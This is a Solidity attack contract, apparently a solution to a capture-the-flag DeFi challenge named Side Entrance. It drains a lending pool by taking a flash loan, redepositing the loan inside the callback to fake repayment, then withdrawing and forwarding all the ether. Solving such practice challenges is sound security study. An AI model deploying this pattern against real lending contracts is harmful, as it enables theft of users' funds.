// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/src/utils/SafeTransferLib.sol";

contract SideEntranceLenderPoolAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable _POOL;

    constructor(address pool) {
        _POOL = SideEntranceLenderPool(payable(pool));
    }

    function execute() external payable override {
        this.deposit{value: msg.value}();
    }

    function attack(address to) external {
        _POOL.flashLoan(address(_POOL).balance);
        _POOL.withdraw();
        SafeTransferLib.safeTransferETH(to, address(this).balance);
    }

    function deposit() external payable {
        _POOL.deposit{value: msg.value}();
    }

    receive() external payable {}
}
